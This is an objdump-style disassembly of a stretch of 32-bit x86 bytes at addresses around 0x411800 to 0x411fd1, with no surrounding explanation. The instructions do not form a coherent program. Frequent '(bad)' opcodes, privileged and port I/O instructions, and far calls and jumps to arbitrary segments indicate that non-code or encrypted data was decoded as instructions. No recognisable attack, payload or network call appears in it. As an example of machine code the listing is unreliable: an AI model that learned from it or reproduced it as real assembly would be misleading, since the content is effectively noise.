  41180a:	test   esp,eax
  41180c:	mov    dl,0xb8
  41180e:	sbb    cl,bh
  411810:	and    ah,BYTE PTR [ecx+0x654ef236]
  411816:	and    al,0x73
  411818:	adc    dh,BYTE PTR [eax+0x37]
  41181b:	cmp    DWORD PTR [esp+ecx*2+0x3b],edi
  41181f:	mov    esi,0xa885ee8d
  411824:	add    eax,0x108dde15
  411829:	add    edi,DWORD PTR [edi-0x1cb01de6]
  41182f:	ret    
  411830:	cmp    DWORD PTR [ecx],edx
  411832:	ret    0xe909
  411835:	(bad)  
  411836:	enter  0x7f38,0x53
  41183a:	jns    0x4117f6
  41183c:	jb     0x411826
  41183e:	call   0xe042:0xe28c6b71
  411845:	das    
  411846:	daa    
  411847:	cld    
  411848:	sub    al,0xc6
  41184a:	das    
  41184b:	or     BYTE PTR [ecx-0x433109e5],al
  411851:	mov    esp,0x377899e2
  411856:	and    BYTE PTR [eax+0x4b67c2df],dh
  41185c:	sbb    DWORD PTR [edx+0x46dd0ff9],ecx
  411862:	cli    
  411863:	(bad)  
  411864:	rcr    BYTE PTR [edx-0x8],cl
  411867:	jb     0x4118bf
  411869:	dec    esi
  41186a:	dec    ebp
  41186b:	imul   edx,eax,0xfffffff7
  41186e:	jo     0x411834
  411870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411871:	mov    ds:0xffe6477c,eax
  411876:	mov    DWORD PTR [edi],ecx
  411878:	push   ds
  411879:	mov    edx,0x6d80b533
  41187e:	clc    
  41187f:	(bad)  
  411880:	jmp    0x411866
  411882:	ffreep st(5)
  411884:	pop    esi
  411885:	xchg   ebp,eax
  411886:	mov    edx,0x19ac48f7
  41188b:	and    edi,esi
  41188d:	add    bl,BYTE PTR [esi+0x20]
  411890:	shl    BYTE PTR [edx],cl
  411892:	leave  
  411893:	pop    esi
  411894:	mov    dh,0x36
  411896:	loope  0x4118e1
  411898:	inc    ebp
  411899:	hlt    
  41189a:	mov    ebx,0x12a8e9a4
  41189f:	inc    edx
  4118a0:	dec    esp
  4118a1:	xchg   ecx,eax
  4118a2:	call   0xf6de:0x36b61595
  4118a9:	fsub   DWORD PTR [ebp-0x59]
  4118ac:	rcl    DWORD PTR [ebx],cl
  4118ae:	xchg   DWORD PTR [ebx+ebp*8],edx
  4118b1:	ret    
  4118b2:	out    dx,al
  4118b3:	cli    
  4118b4:	mov    ch,0x3
  4118b6:	sbb    DWORD PTR [esi+0xbe62cf4],eax
  4118bc:	daa    
  4118bd:	inc    ecx
  4118be:	xchg   edx,eax
  4118bf:	scas   eax,DWORD PTR es:[edi]
  4118c0:	ret    
  4118c1:	sbb    al,0x7c
  4118c3:	(bad)  
  4118c4:	push   ds
  4118c5:	mov    esp,0x3637511d
  4118ca:	mov    al,ds:0xcff77ea
  4118cf:	(bad)  
  4118d0:	adc    BYTE PTR [ebx-0x7d],ah
  4118d3:	jg     0x41191e
  4118d5:	inc    ebp
  4118d6:	push   0xc043a5d2
  4118db:	cmc    
  4118dc:	pop    edx
  4118dd:	inc    edi
  4118de:	in     al,dx
  4118df:	push   ebx
  4118e0:	sbb    bl,BYTE PTR [eax+eiz*2]
  4118e3:	pop    eax
  4118e4:	call   DWORD PTR [eax+0x66]
  4118e7:	out    0xf6,eax
  4118e9:	lahf   
  4118ea:	popa   
  4118eb:	call   0xb1bcf26e
  4118f0:	xor    DWORD PTR [ebx-0x62],esi
  4118f3:	sbb    al,0x58
  4118f5:	ret    0xa94e
  4118f8:	mov    BYTE PTR [ebx],bh
  4118fa:	mov    esp,0xaba68285
  4118ff:	mov    dh,0x3d
  411901:	daa    
  411902:	push   ebp
  411903:	push   ecx
  411904:	sbb    dl,BYTE PTR [ebx]
  411906:	ins    BYTE PTR es:[edi],dx
  411907:	and    cl,BYTE PTR ds:0xb9864640
  41190d:	cs js  0x411933
  411910:	cmp    DWORD PTR [edi-0x5f],esp
  411913:	jle    0x41194c
  411915:	push   es
  411916:	ins    BYTE PTR es:[edi],dx
  411917:	sbb    BYTE PTR [edx+0x6d45dc2f],0xd6
  41191e:	xchg   ebx,eax
  41191f:	call   0xf727a0cf
  411924:	mov    al,ds:0x7f03e709
  411929:	xchg   edi,eax
  41192a:	add    BYTE PTR [edx-0x726dba56],cl
  411930:	and    DWORD PTR [ecx+0x72ec9b64],edx
  411936:	sub    DWORD PTR [ecx+edi*4-0x4b],ebp
  41193a:	hlt    
  41193b:	int3   
  41193c:	jmp    0x3d80:0xd4852cfd
  411943:	pop    ecx
  411944:	ret    0x7295
  411947:	jb     0x4118e2
  411949:	adc    WORD PTR ss:[esi+0x437fe06a],si
  411951:	xor    eax,0xc8279f03
  411956:	das    
  411957:	mov    ebx,eax
  411959:	pop    eax
  41195a:	mov    ebp,ds
  41195c:	(bad)
  41195f:	mov    al,0x8c
  411961:	inc    ebp
  411962:	fyl2x  
  411964:	loope  0x411991
  411966:	mov    gs,ebp
  411968:	std    
  411969:	stos   BYTE PTR es:[edi],al
  41196a:	rcl    DWORD PTR [edi-0x55],cl
  41196d:	out    dx,eax
  41196e:	retf   
  41196f:	push   edx
  411970:	test   ch,0xaa
  411973:	jne    0x4119e0
  411975:	aas    
  411976:	clc    
  411977:	sar    BYTE PTR [ebx],0x78
  41197a:	test   edi,esp
  41197c:	sti    
  41197d:	data16 add BYTE PTR [ebx],dh
  411980:	ret    
  411981:	int    0x4c
  411983:	and    eax,0x4b6788a
  411988:	adc    DWORD PTR fs:[edx+0x14],esi
  41198c:	add    eax,0x517c917b
  411991:	stos   DWORD PTR es:[edi],eax
  411992:	inc    esp
  411993:	inc    esi
  411994:	sbb    al,0xb0
  411996:	dec    esp
  411997:	dec    esp
  411998:	mov    eax,0x35d1f2b3
  41199d:	push   eax
  41199e:	call   0x13a:0xcbde9f58
  4119a5:	sbb    DWORD PTR [eax],esp
  4119a7:	lds    eax,FWORD PTR [ecx+0x6adfb5fd]
  4119ad:	cmp    al,0xd5
  4119af:	dec    ebp
  4119b0:	arpl   si,bp
  4119b2:	push   esp
  4119b3:	aaa    
  4119b4:	push   esi
  4119b5:	test   DWORD PTR [ebx+ebp*1+0x1d29adfd],ebx
  4119bc:	pop    ds
  4119bd:	rcr    edx,1
  4119bf:	and    ebp,DWORD PTR [ecx-0x69]
  4119c2:	daa    
  4119c3:	clc    
  4119c4:	jl     0x411a05
  4119c6:	mov    WORD PTR [ebp+esi*1-0x55],?
  4119ca:	test   al,0x9f
  4119cc:	outs   dx,BYTE PTR ds:[esi]
  4119cd:	sbb    BYTE PTR [edx],0x61
  4119d0:	jecxz  0x4119b7
  4119d2:	sub    BYTE PTR ds:[ecx+0x7f87fb55],al
  4119d9:	push   ds
  4119da:	jmp    DWORD PTR [esi+esi*8-0x76]
  4119de:	xchg   edx,eax
  4119df:	sbb    eax,0xd4ada0c3
  4119e4:	push   ecx
  4119e5:	stos   BYTE PTR es:[edi],al
  4119e6:	mov    DWORD PTR ds:0x157d972b,esi
  4119ec:	xchg   ebp,eax
  4119ed:	xor    BYTE PTR [ebp+0x2ad3bd1d],bh
  4119f3:	adc    edi,DWORD PTR [edi-0x1c83ad1d]
  4119f9:	and    ah,BYTE PTR [edx-0x379d9da]
  4119ff:	push   ss
  411a00:	sub    ebx,DWORD PTR [ecx+esi*1-0x6c]
  411a04:	daa    
  411a05:	sbb    eax,0x3c9b734d
  411a0a:	bound  edi,QWORD PTR [eax+ebp*1-0x22]
  411a0e:	daa    
  411a0f:	xor    esp,DWORD PTR [eax-0xc]
  411a12:	jmp    0xd225:0xa2de9bf6
  411a19:	jecxz  0x4119a4
  411a1b:	and    bh,ah
  411a1d:	ret    0xe1f9
  411a20:	fst    DWORD PTR [ebp+0x5cb2b510]
  411a26:	dec    edx
  411a27:	jge    0x411a11
  411a29:	data16 jg 0x411a32
  411a2c:	push   ebx
  411a2d:	pop    esp
  411a2e:	xchg   esi,eax
  411a2f:	inc    edx
  411a30:	sbb    ah,BYTE PTR [ebx+0x7]
  411a33:	(bad)  [ebp-0x67c9a2cb]
  411a39:	lods   eax,DWORD PTR ds:[esi]
  411a3a:	or     DWORD PTR [edx-0x44],esi
  411a3d:	loopne 0x4119da
  411a3f:	mov    WORD PTR [edx],ds
  411a41:	sbb    bl,cl
  411a43:	or     eax,DWORD PTR [ecx-0x2d343a32]
  411a49:	loope  0x4119d8
  411a4b:	jns    0x411a86
  411a4d:	retf   
  411a4e:	xor    ebx,DWORD PTR [ebx+esi*8+0x5b]
  411a52:	inc    ebp
  411a53:	fcom   DWORD PTR [ebp+0x24904081]
  411a59:	cmp    DWORD PTR [edi-0x7fc86d90],0xfd05a928
  411a63:	stos   BYTE PTR es:[edi],al
  411a64:	jnp    0x411a0f
  411a66:	push   ecx
  411a67:	data16 sub al,0xcf
  411a6a:	xchg   DWORD PTR [esi-0x636ed9f3],ebx
  411a70:	jbe    0x411a5e
  411a72:	or     cl,ah
  411a74:	add    al,0x92
  411a76:	or     dl,BYTE PTR ds:0x67749e24
  411a7c:	jne    0x411ab7
  411a7e:	rcr    ah,0x74
  411a81:	fwait
  411a82:	(bad)  
  411a83:	jl     0x411a92
  411a85:	in     eax,dx
  411a86:	rcr    DWORD PTR [esi+0x7bf96472],cl
  411a8c:	popf   
  411a8d:	hlt    
  411a8e:	add    al,0xbf
  411a90:	inc    ebx
  411a91:	sbb    eax,0x19bac92f
  411a96:	jb     0x411b02
  411a98:	outs   dx,BYTE PTR ds:[esi]
  411a99:	test   BYTE PTR [esi],cl
  411a9b:	xor    al,0x44
  411a9d:	mov    cl,0xf
  411a9f:	mov    ss,esp
  411aa1:	test   al,0x1e
  411aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aa4:	into   
  411aa5:	call   0xcdbc:0xe749b46b
  411aac:	push   edi
  411aad:	pop    edx
  411aae:	stos   DWORD PTR es:[edi],eax
  411aaf:	mov    dh,0x9f
  411ab1:	push   es
  411ab2:	xlat   BYTE PTR ds:[ebx]
  411ab3:	mov    edi,0x400681b5
  411ab8:	scas   eax,DWORD PTR es:[edi]
  411ab9:	mov    edx,0x33bbd4b8
  411abe:	sbb    al,0xf0
  411ac0:	dec    esp
  411ac1:	pop    ecx
  411ac2:	xor    BYTE PTR [ebx],0xb0
  411ac5:	sub    DWORD PTR [ecx],0x27
  411ac8:	and    ebx,eax
  411aca:	(bad)  
  411acb:	mov    dh,0x64
  411acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ace:	pop    ds
  411acf:	mov    cs,edi
  411ad1:	mov    dh,0x78
  411ad3:	mov    esp,0x418066d1
  411ad8:	inc    ecx
  411ad9:	mov    edi,0x8482a8c6
  411ade:	fwait
  411adf:	(bad)  
  411ae0:	push   0x8d189c62
  411ae5:	stos   BYTE PTR es:[edi],al
  411ae6:	cdq    
  411ae7:	sahf   
  411ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae9:	and    bh,BYTE PTR [eax-0x6b1a315a]
  411aef:	adc    dl,cl
  411af1:	es inc ecx
  411af3:	out    0xd6,al
  411af5:	shl    DWORD PTR [ecx-0x7c447bfe],1
  411afb:	sub    cl,BYTE PTR [edi+0x51fa7791]
  411b01:	repnz sbb esp,DWORD PTR [ebp-0x7a]
  411b05:	bound  ebx,QWORD PTR [edi]
  411b07:	rcl    BYTE PTR [esi-0x27],0x6f
  411b0b:	arpl   WORD PTR [ebx*1-0x55fed21e],sp
  411b12:	fs or  al,0x7
  411b15:	mov    ds:0x62633e58,eax
  411b1a:	sbb    BYTE PTR [edi+0x37],dh
  411b1d:	ins    BYTE PTR es:[edi],dx
  411b1e:	(bad)  
  411b1f:	ror    DWORD PTR [edx-0x6b],1
  411b22:	neg    BYTE PTR [ebp-0x3b72e38]
  411b28:	imul   BYTE PTR [ebp+0x26]
  411b2b:	cli    
  411b2c:	xchg   ebx,eax
  411b2d:	out    0xb3,eax
  411b2f:	outs   dx,BYTE PTR ds:[esi]
  411b30:	cld    
  411b31:	pushf  
  411b32:	jno    0x411b2b
  411b34:	cmp    dl,al
  411b36:	mov    ebx,0x86b3d8e
  411b3b:	cvtpi2ps xmm5,QWORD PTR [ebx]
  411b3e:	lods   al,BYTE PTR ds:[esi]
  411b3f:	cs or  eax,0x23d922c9
  411b45:	std    
  411b46:	mov    BYTE PTR ds:0xd0881a3,bh
  411b4c:	outs   dx,BYTE PTR ds:[esi]
  411b4d:	dec    ecx
  411b4e:	sub    DWORD PTR [ecx],eax
  411b50:	jmp    0x3a91:0x846015a6
  411b57:	add    DWORD PTR [ebx],0x24
  411b5a:	mov    eax,ds:0x116a0d94
  411b5f:	adc    eax,0xd42a7fb3
  411b64:	jb     0x411bb6
  411b66:	jmp    0x411bca
  411b68:	out    dx,eax
  411b69:	and    ecx,0xffffff94
  411b6c:	retf   0x8df3
  411b6f:	pop    edx
  411b70:	jno    0x411b57
  411b72:	adc    BYTE PTR [ebx+0x729dc213],0xa
  411b79:	pop    es
  411b7a:	add    esi,DWORD PTR [edx]
  411b7c:	leave  
  411b7d:	cmp    eax,0xff827759
  411b82:	mov    esi,DWORD PTR [ebp+esi*1+0x78]
  411b86:	push   ss
  411b87:	xchg   esp,eax
  411b88:	retf   
  411b89:	gs mov cl,0x9d
  411b8c:	mov    WORD PTR [esi+0x2],?
  411b8f:	fsub   DWORD PTR [eax-0x7f201bc4]
  411b95:	lock cld 
  411b97:	aaa    
  411b98:	pop    ebp
  411b99:	pop    ss
  411b9a:	stc    
  411b9b:	test   DWORD PTR [esi+0x8626e08],ebx
  411ba1:	and    al,0xf5
  411ba3:	mov    dl,0xf2
  411ba5:	int    0xc2
  411ba7:	jle    0x411c20
  411ba9:	inc    ecx
  411baa:	jecxz  0x411c29
  411bac:	adc    DWORD PTR [ebp+eiz*4+0x4522fc2d],0x3e
  411bb4:	stos   BYTE PTR es:[edi],al
  411bb5:	mov    ah,0xe4
  411bb7:	cmp    eax,0xbf256865
  411bbc:	push   ebp
  411bbd:	jo     0x411c1d
  411bbf:	add    eax,0x801b6920
  411bc4:	aad    0xec
  411bc6:	rcr    BYTE PTR [ebx-0x6d],1
  411bc9:	xchg   esp,eax
  411bca:	xor    cl,BYTE PTR [edx]
  411bcc:	test   al,0x62
  411bce:	(bad)  
  411bcf:	cmp    ebp,ebx
  411bd1:	jns    0x411c3a
  411bd3:	jo     0x411b8e
  411bd5:	add    dh,BYTE PTR [edi]
  411bd7:	and    esi,DWORD PTR [edi+0x2c]
  411bda:	mov    dl,0xd4
  411bdc:	outs   dx,BYTE PTR ds:[esi]
  411bdd:	in     al,dx
  411bde:	pop    ds
  411bdf:	cmp    eax,0xe6242ee4
  411be4:	or     al,0xe1
  411be6:	ret    0x4a29
  411be9:	sub    DWORD PTR [ebx+0x28],ecx
  411bec:	fstp   DWORD PTR [eax+0x4d]
  411bef:	jmp    0xb7e7:0x4345cfd3
  411bf6:	sub    edx,DWORD PTR [ecx]
  411bf8:	pushf  
  411bf9:	push   es
  411bfa:	mov    ds:0x8fe519a6,eax
  411bff:	or     dh,BYTE PTR cs:[eax]
  411c02:	cmp    bh,BYTE PTR [edi+eax*2-0x36]
  411c06:	imul   esi,DWORD PTR [esi-0x426b041a],0x2b
  411c0d:	push   0x1d
  411c0f:	dec    esi
  411c10:	inc    eax
  411c11:	add    eax,0x90cc1ee0
  411c16:	daa    
  411c17:	sub    eax,0x3546a9a2
  411c1c:	xor    BYTE PTR [esi-0x6b529b8c],0x78
  411c23:	lds    ebx,FWORD PTR ds:0x584cc40a
  411c29:	pop    ebx
  411c2a:	inc    esp
  411c2b:	sahf   
  411c2c:	shr    DWORD PTR [ecx],1
  411c2e:	rcl    BYTE PTR [edx],1
  411c30:	pop    ecx
  411c31:	mov    ds:0xb78489e5,eax
  411c36:	mov    dh,0xe2
  411c38:	aad    0xbf
  411c3a:	cmp    ah,bl
  411c3c:	xor    bl,BYTE PTR [esi-0x7]
  411c3f:	leave  
  411c40:	mov    eax,0x62c0ab16
  411c45:	mov    WORD PTR [edx-0x106e1728],cs
  411c4b:	add    ebx,esp
  411c4d:	pop    es
  411c4e:	enter  0x2ef6,0xa7
  411c52:	inc    edi
  411c53:	adc    DWORD PTR [ecx],0xffffffca
  411c56:	call   0xd7c7be96
  411c5b:	gs out dx,eax
  411c5d:	(bad)  
  411c5e:	push   ebx
  411c5f:	ds jmp 0x4d80:0x7b10c1a4
  411c67:	push   edx
  411c68:	push   ds
  411c69:	sub    BYTE PTR [esi+0x746acc88],ch
  411c6f:	pop    edx
  411c70:	mov    ss,WORD PTR [ecx-0x3]
  411c73:	pop    esp
  411c74:	dec    edi
  411c75:	out    dx,al
  411c76:	fadd   QWORD PTR [ebp-0x74]
  411c79:	stos   DWORD PTR es:[edi],eax
  411c7a:	mov    DWORD PTR [edi-0x47],edx
  411c7d:	test   DWORD PTR [esi+edi*4+0x5ec4be13],0xf349d520
  411c88:	mov    al,0x40
  411c8a:	pop    ecx
  411c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c8c:	int3   
  411c8d:	sbb    al,0xed
  411c8f:	clc    
  411c90:	push   edi
  411c91:	into   
  411c92:	or     dh,BYTE PTR [edx]
  411c94:	jae    0x411d08
  411c96:	sub    eax,0xae0c6de
  411c9b:	cmp    dh,BYTE PTR [ecx]
  411c9d:	in     eax,dx
  411c9e:	cmp    eax,0x5f5d197a
  411ca3:	pop    eax
  411ca4:	je     0x411d05
  411ca6:	jecxz  0x411c31
  411ca8:	ror    ebx,cl
  411caa:	jp     0x411c89
  411cac:	sbb    DWORD PTR [eax-0x67],0xa648e9d2
  411cb3:	xchg   ebx,eax
  411cb4:	lea    edx,[ebp-0xf]
  411cb7:	dec    edi
  411cb8:	mov    edi,0xfee3cdf5
  411cbd:	popa   
  411cbe:	adc    esp,DWORD PTR [edi]
  411cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cc1:	imul   esp,DWORD PTR [ebx-0x51547049],0x3233d29e
  411ccb:	sbb    esi,DWORD PTR ds:0xfa777f98
  411cd1:	repz mov dl,0xf7
  411cd4:	stc    
  411cd5:	popa   
  411cd6:	fiadd  DWORD PTR [ebx-0x79877acd]
  411cdc:	ds aam 0xb4
  411cdf:	in     eax,dx
  411ce0:	cdq    
  411ce1:	mov    ecx,0x410a1e80
  411ce6:	mov    ebx,0x99699ee6
  411ceb:	mov    ds:0x861a6b0d,eax
  411cf0:	outs   dx,BYTE PTR ds:[esi]
  411cf1:	cli    
  411cf2:	js     0x411ccf
  411cf4:	jbe    0x411d68
  411cf6:	sti    
  411cf7:	sbb    BYTE PTR [ebx+0x9d7dcb9],bl
  411cfd:	repz rcr DWORD PTR [esi+0x44],cl
  411d01:	arpl   WORD PTR [ecx-0x2a0fa498],di
  411d07:	ja     0x411d2f
  411d09:	mov    WORD PTR [ecx+0x5e],?
  411d0c:	sar    BYTE PTR [eax+ecx*2],0x68
  411d10:	cmp    al,0xce
  411d12:	shl    DWORD PTR [edi-0x43bedc40],0x17
  411d19:	sbb    ch,bl
  411d1b:	mov    dh,BYTE PTR [edi-0x348a78f2]
  411d21:	dec    eax
  411d22:	mov    edi,0x62aa291c
  411d27:	les    ebx,FWORD PTR [esi-0x7194b157]
  411d2d:	retf   0x9f26
  411d30:	pop    ecx
  411d31:	xor    bl,BYTE PTR [esi]
  411d33:	and    eax,DWORD PTR [ebx]
  411d35:	push   0x51acaaa0
  411d3a:	jp     0x411d59
  411d3c:	inc    eax
  411d3d:	dec    eax
  411d3e:	sbb    BYTE PTR [ebx],dh
  411d40:	aaa    
  411d41:	loope  0x411d69
  411d43:	loop   0x411db6
  411d45:	pusha  
  411d46:	outs   dx,BYTE PTR ds:[esi]
  411d47:	adc    bl,dh
  411d49:	add    ecx,DWORD PTR [ecx-0x3fb433f9]
  411d4f:	or     DWORD PTR [ebp+0x70],ecx
  411d52:	inc    edx
  411d53:	cli    
  411d54:	sub    cl,bl
  411d56:	scas   eax,DWORD PTR es:[edi]
  411d57:	pop    ebp
  411d58:	or     ebx,DWORD PTR [ebx]
  411d5a:	mov    eax,0x2a773da0
  411d5f:	and    DWORD PTR [eax+0x45de7df4],esi
  411d65:	retf   
  411d66:	or     ebp,DWORD PTR [ecx]
  411d68:	fidiv  WORD PTR [edi+ebx*1+0x46a48cba]
  411d6f:	xchg   esp,eax
  411d70:	cwde   
  411d71:	pushf  
  411d72:	dec    edi
  411d73:	into   
  411d74:	ror    DWORD PTR ds:0xbd02eac3,1
  411d7a:	cmp    edx,ebp
  411d7c:	and    al,0xb2
  411d7e:	daa    
  411d7f:	fsub   DWORD PTR [ebx+edx*4]
  411d82:	cmp    dh,ch
  411d84:	xlat   BYTE PTR ds:[ebx]
  411d85:	pushf  
  411d86:	dec    edi
  411d87:	es call 0xf3a:0x201052cb
  411d8f:	hlt    
  411d90:	data16 hlt 
  411d92:	pop    esp
  411d93:	pop    eax
  411d94:	mov    ds:0x94ec06c4,eax
  411d99:	fidivr DWORD PTR [ecx]
  411d9b:	int3   
  411d9c:	inc    ecx
  411d9d:	sub    al,0x32
  411d9f:	dec    ecx
  411da0:	cli    
  411da1:	mov    ds:0xe9818c8f,al
  411da6:	jns    0x411d47
  411da8:	jg     0x411d48
  411daa:	fdivr  st(6),st
  411dac:	in     al,0xc3
  411dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411daf:	push   ss
  411db0:	aas    
  411db1:	add    dh,BYTE PTR [eax+ebx*1-0x358e5a5c]
  411db8:	push   ebp
  411db9:	pop    eax
  411dba:	sub    dl,cl
  411dbc:	jmp    0xf41119d6
  411dc1:	pop    es
  411dc2:	jns    0x411daf
  411dc4:	std    
  411dc5:	fild   WORD PTR [ecx]
  411dc7:	or     esi,ecx
  411dc9:	mov    BYTE PTR [esp+eax*4-0x220c6da8],dh
  411dd0:	jae    0x411db0
  411dd2:	in     eax,dx
  411dd3:	or     al,0xd0
  411dd5:	jg     0x411e37
  411dd7:	adc    dl,dl
  411dd9:	inc    eax
  411dda:	les    edi,FWORD PTR [edx+0x63]
  411ddd:	ficom  DWORD PTR ds:[edx+ebx*2+0x1e]
  411de2:	push   eax
  411de3:	rcr    DWORD PTR [eax+eax*2],0xf4
  411de7:	xchg   edi,eax
  411de8:	push   edx
  411de9:	js     0x411e0d
  411deb:	ja     0x411dab
  411ded:	shl    DWORD PTR [edi],1
  411def:	inc    eax
  411df0:	hlt    
  411df1:	aaa    
  411df2:	sar    esi,cl
  411df4:	cmp    DWORD PTR [eax+0x6f],0x23
  411df8:	iret   
  411df9:	out    dx,eax
  411dfa:	jg     0x411e5f
  411dfc:	sbb    ah,0x44
  411dff:	push   ebp
  411e00:	cs xor eax,0x1aeb729f
  411e06:	lock (bad) 
  411e08:	jmp    0x411dc8
  411e0a:	or     esp,DWORD PTR [eax-0x24]
  411e0d:	nop
  411e0e:	out    0xe2,eax
  411e10:	out    0xc4,eax
  411e12:	xor    BYTE PTR [ecx+0x79a242ea],ah
  411e18:	test   eax,0xc1cb4a68
  411e1d:	mov    edx,0xf863d9f1
  411e22:	ret    
  411e23:	inc    esi
  411e24:	add    ch,BYTE PTR [ebx-0x25]
  411e27:	scas   al,BYTE PTR es:[edi]
  411e28:	mov    al,0xb5
  411e2a:	rcl    DWORD PTR [eax-0x5153c1ac],1
  411e30:	ret    
  411e31:	sbb    edx,DWORD PTR [ecx+0x43]
  411e34:	je     0x411e82
  411e36:	xchg   ecx,eax
  411e37:	xchg   BYTE PTR [ebx-0x38cb1e60],ch
  411e3d:	je     0x411e56
  411e3f:	xor    al,BYTE PTR fs:[esi]
  411e42:	test   DWORD PTR [eax],ebp
  411e44:	fist   WORD PTR [ecx+0xd79c8a8]
  411e4a:	sbb    DWORD PTR [edx-0x3d],edx
  411e4d:	sbb    cl,BYTE PTR [edi+0x77c405a]
  411e53:	fmulp  st(0),st
  411e55:	mov    WORD PTR [esi+0x35],es
  411e58:	loopne 0x411eb9
  411e5a:	pause  
  411e5c:	and    eax,0x3a6503fe
  411e61:	xchg   esi,eax
  411e62:	and    eax,0xf2659be3
  411e67:	call   0xd8774975
  411e6c:	sbb    BYTE PTR [ecx-0x22],al
  411e6f:	(bad)  
  411e70:	pusha  
  411e71:	jp     0x411e07
  411e73:	lods   al,BYTE PTR ds:[esi]
  411e74:	xor    DWORD PTR [edx],0x46cbaa8e
  411e7a:	loopne 0x411e36
  411e7c:	jecxz  0x411e68
  411e7e:	aas    
  411e7f:	jle    0x411e04
  411e81:	mov    dh,0x2a
  411e83:	lds    edx,FWORD PTR [edx-0x6d46b6df]
  411e89:	pop    sp
  411e8b:	aam    0xea
  411e8d:	mov    ah,0x75
  411e8f:	cmp    eax,ebp
  411e91:	stos   BYTE PTR es:[edi],al
  411e92:	icebp  
  411e93:	les    edx,FWORD PTR [ebp-0x69c81f28]
  411e99:	add    ebp,DWORD PTR [edx]
  411e9b:	add    esp,0x36
  411e9e:	jne    0x411f13
  411ea0:	mov    DWORD PTR [esi+esi*2],esi
  411ea3:	shr    DWORD PTR [ecx+0x383e0583],cl
  411ea9:	sti    
  411eaa:	scas   al,BYTE PTR es:[edi]
  411eab:	dec    esp
  411eac:	adc    DWORD PTR [edx+ebx*8-0x18b2513b],eax
  411eb3:	pop    ebp
  411eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb5:	lea    ebx,[ebx-0x53ef5fcc]
  411ebb:	pop    eax
  411ebc:	int3   
  411ebd:	push   edx
  411ebe:	call   0xf954f726
  411ec3:	mov    DWORD PTR [eax+0x53],esp
  411ec6:	sub    DWORD PTR [esi+eax*2+0x75],edx
  411eca:	sahf   
  411ecb:	push   esi
  411ecc:	push   ss
  411ecd:	xchg   ebp,eax
  411ece:	mov    ebx,0x1e0d7d24
  411ed3:	pop    es
  411ed4:	adc    ebp,ebx
  411ed6:	scas   eax,DWORD PTR es:[edi]
  411ed7:	adc    edx,ebx
  411ed9:	jmp    0x85ac:0xa1eccb72
  411ee0:	and    eax,DWORD PTR cs:[edi]
  411ee3:	stos   DWORD PTR es:[edi],eax
  411ee4:	sbb    bh,BYTE PTR [ebp+0x1c]
  411ee7:	mov    ds:0xb18a6c23,al
  411eec:	jmp    0xcad9a450
  411ef1:	pop    ebx
  411ef2:	jns    0x411f65
  411ef4:	daa    
  411ef5:	nop
  411ef6:	das    
  411ef7:	xchg   ecx,eax
  411ef8:	call   0xf1154ba2
  411efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411efe:	mov    esi,0x44f8fe48
  411f03:	adc    ecx,DWORD PTR [edx-0x1ea0428f]
  411f09:	mov    ch,BYTE PTR [eax+0x1e]
  411f0c:	push   ebx
  411f0d:	inc    edi
  411f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f0f:	cmp    eax,0x9cae1c86
  411f14:	push   es
  411f15:	pop    ebp
  411f16:	cmp    BYTE PTR [esi-0x76702a13],bl
  411f1c:	iret   
  411f1d:	inc    esp
  411f1e:	fsub   st(1),st
  411f20:	das    
  411f21:	or     al,0xac
  411f23:	sbb    bl,cl
  411f25:	sub    cl,BYTE PTR [edi-0x3f43cb3d]
  411f2b:	dec    edi
  411f2c:	out    0x33,eax
  411f2e:	fild   WORD PTR [edx+eiz*1-0x78]
  411f32:	int3   
  411f33:	jnp    0x411f81
  411f35:	psubq  mm1,QWORD PTR [esi-0x413c9696]
  411f3c:	push   es
  411f3d:	inc    ecx
  411f3e:	xchg   esi,ecx
  411f40:	push   ecx
  411f41:	dec    eax
  411f42:	xchg   ch,cl
  411f44:	sahf   
  411f45:	(bad)  
  411f46:	pop    ebx
  411f47:	xchg   esi,eax
  411f48:	jnp    0x411fbe
  411f4a:	loop   0x411f7d
  411f4c:	aad    0x71
  411f4e:	jmp    0x980a:0xe7ba6daf
  411f55:	pop    edi
  411f56:	or     eax,0xae2530b7
  411f5b:	pop    edx
  411f5c:	sbb    ah,BYTE PTR ds:0x20600212
  411f62:	gs ins BYTE PTR es:[edi],dx
  411f64:	push   0xcf7495f2
  411f69:	mov    bl,0x85
  411f6b:	xchg   edi,eax
  411f6c:	je     0x411f25
  411f6e:	pop    ebx
  411f6f:	or     BYTE PTR [edx+0x2f275d31],ah
  411f75:	lods   al,BYTE PTR ds:[esi]
  411f76:	cmp    eax,0x8ddfa584
  411f7b:	pop    es
  411f7c:	test   bh,0x18
  411f7f:	fimul  WORD PTR [esi-0x5b]
  411f82:	push   es
  411f83:	xor    dl,cl
  411f85:	cmp    DWORD PTR [eax-0x2762fe6f],esi
  411f8b:	out    dx,al
  411f8c:	clc    
  411f8d:	lods   eax,DWORD PTR ds:[esi]
  411f8e:	cld    
  411f8f:	push   ds
  411f90:	repnz push eax
  411f92:	mov    ebp,DWORD PTR [esi+0x7d]
  411f95:	jne    0x411f42
  411f97:	cmp    dl,al
  411f99:	loope  0x411f3e
  411f9b:	(bad)  
  411f9c:	in     al,0x4b
  411f9e:	sbb    eax,DWORD PTR [edx+0x47]
  411fa1:	imul   ebp,eax,0xffffff84
  411fa4:	xor    ch,BYTE PTR [edx+0x5898bfc1]
  411faa:	adc    al,0xbe
  411fac:	xchg   esp,eax
  411fad:	lods   al,BYTE PTR ds:[esi]
  411fae:	sbb    eax,0x9fee96b0
  411fb3:	test   DWORD PTR [edx],ebp
  411fb5:	cmp    ch,dl
  411fb7:	les    ecx,FWORD PTR [esp+ecx*2-0x4caedb5d]
  411fbe:	mov    ah,0xca
  411fc0:	out    dx,al
  411fc1:	add    ebx,DWORD PTR [ecx-0x12]
  411fc4:	repz adc BYTE PTR [ebx],ah
  411fc7:	call   0x7301:0xb4084922
  411fce:	sti    
  411fcf:	sub    al,0xa8
  411fd1:	repz fcmovu st,st(6)
